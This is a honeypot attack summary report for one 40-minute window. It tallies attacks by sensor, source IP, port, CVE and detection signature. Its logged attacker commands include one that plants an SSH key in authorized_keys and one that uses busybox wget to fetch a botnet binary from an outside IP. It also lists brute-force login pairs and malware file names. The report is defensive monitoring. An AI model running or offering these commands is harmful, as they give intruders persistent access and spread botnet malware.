# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-02T02:01:34Z
**Timeframe:** 2025-10-02T01:20:01Z to 2025-10-02T02:00:01Z
**Files Used:**
- agg_log_20251002T012001Z.json
- agg_log_20251002T014001Z.json
- agg_log_20251002T020001Z.json

---

## Executive Summary

This report summarizes 22,540 attacks recorded across the honeypot network. The majority of attacks were captured by the Honeytrap and Cowrie honeypots. A significant portion of the attacks originated from the IP address 45.187.123.146. The most targeted ports were 445 (SMB) and 25 (SMTP). Attackers attempted to exploit several vulnerabilities, including older CVEs. A common attack pattern involved attempts to add a malicious SSH key to the authorized_keys file.

---

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 7968
- Cowrie: 6968
- Suricata: 2753
- Dionaea: 1810
- Mailoney: 1671
- Ciscoasa: 1199
- Tanner: 46
- Adbhoney: 29
- H0neytr4p: 28
- Sentrypeer: 26
- ElasticPot: 15
- Honeyaml: 10
- Redishoneypot: 6
- Dicompot: 6
- ConPot: 3
- Ipphoney: 2

### Top Attacking IPs
- 45.187.123.146
- 103.130.215.15
- 176.65.141.117
- 139.0.28.226
- 115.79.27.192
- 129.212.180.229
- 159.89.166.213
- 185.156.73.166
- 92.63.197.55
- 194.32.87.93

### Top Targeted Ports/Protocols
- 445 (SMB)
- 25 (SMTP)
- 22 (SSH)
- TCP/445
- 8333
- 5901
- 2323
- 80 (HTTP)
- 443 (HTTPS)
- 5060 (SIP)

### Most Common CVEs
- CVE-2001-0414
- CVE-2002-0012
- CVE-2002-0013
- CVE-2021-35394
- CVE-2023-26801
- CVE-2023-31983

### Commands Attempted by Attackers
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `w`
- `crontab -l`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- 2024766
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET SCAN NMAP -sS window 1024
- 2009582
- ET HUNTING RDP Authentication Bypass Attempt
- 2034857

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/nPSpP4PBW0
- oscar/oscar
- george/george
- es/es
- root/passw0rd
- root/1Q2w3e4r
- ubuntu/ubuntu
- root/adminHW
- anonymous/
- test/test
- elastic/elastic

### Files Uploaded/Downloaded
- wget.sh
- Space.mips
- w.sh
- c.sh
- bbw
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

### HTTP User-Agents
- No HTTP User-Agent data was recorded in this timeframe.

### SSH Clients
- No SSH client data was recorded in this timeframe.

### SSH Servers
- No SSH server data was recorded in this timeframe.

### Top Attacker AS Organizations
- No attacker AS organization data was recorded in this timeframe.

---

## Key Observations and Anomalies

- A significant number of attacks focused on compromising SSH by adding a specific public key to the `authorized_keys` file.
- The "DoublePulsar" backdoor signature was triggered a large number of times, suggesting attempts to exploit SMB vulnerabilities.
- Attackers frequently attempted to download and execute malicious scripts from `94.154.35.154` and `139.162.143.187`.
- The volume of attacks increased significantly in the last of the three log files.
